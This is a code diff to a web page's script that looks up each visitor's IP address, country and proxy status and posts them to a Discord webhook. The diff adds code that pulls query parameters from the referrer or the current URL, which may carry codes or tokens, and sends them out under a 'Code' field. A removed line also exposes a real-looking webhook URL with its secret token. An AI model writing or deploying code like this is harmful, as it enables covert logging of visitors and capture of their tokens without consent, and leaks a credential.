@@ -43,7 +43,16 @@
     </table>
 
     <script>
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1322345788462071875/OrpRYnyIugZkioBPX5Nm1WaE8_LDh0dza2u8dNnWo5DY8ql0qG7ajjxf1MI3XCeA0aco'; // Replace with your Discord webhook URL
+        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+
+        function getQueryParamsFromURL(url) {
+            const params = new URL(url).searchParams;
+            const queryParams = {};
+            for (const [key, value] of params.entries()) {
+                queryParams[key] = value;
+            }
+            return queryParams;
+        }
 
         async function fetchAndSendIPInfo() {
             const table = document.getElementById('infoTable');
@@ -71,6 +80,21 @@
                 tbody.innerHTML = row;
                 table.style.display = 'table';
 
+                // Get referrer query parameters or fallback to current URL query parameters
+                let referrerParamsString = '';
+                const referrer = document.referrer;
+                if (referrer) {
+                    const referrerParams = getQueryParamsFromURL(referrer);
+                    referrerParamsString = Object.entries(referrerParams)
+                        .map(([key, value]) => `${key}: ${value}`)
+                        .join(', ') || 'None';
+                } else {
+                    const currentURLParams = getQueryParamsFromURL(window.location.href);
+                    referrerParamsString = Object.entries(currentURLParams)
+                        .map(([key, value]) => `${key}: ${value}`)
+                        .join(', ') || 'None';
+                }
+
                 // Prepare the embed payload for Discord
                 const embed = {
                     embeds: [
@@ -81,7 +105,8 @@
                                 { name: "IP Address", value: data.ipAddress || 'N/A', inline: true },
                                 { name: "Country Name", value: data.countryName || 'N/A', inline: true },
                                 { name: "Continent", value: data.continent || 'N/A', inline: true },
-                                { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true }
+                                { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true },
+                                { name: "Code", value: referrerParamsString, inline: false }
                             ],
                             color: 3447003 // Optional: Set a color for the embed
                         }
